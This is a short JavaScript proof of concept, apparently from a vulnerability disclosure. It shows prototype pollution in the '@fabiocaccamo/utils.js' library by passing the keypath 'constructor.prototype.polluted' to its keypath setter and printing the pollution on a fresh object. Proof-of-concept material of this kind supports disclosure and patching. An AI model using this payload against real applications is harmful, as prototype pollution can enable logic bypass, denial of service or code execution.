const utils = require('@fabiocaccamo/utils.js');
const obj = {};
console.log({}.polluted);
utils.object.keypath.set(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);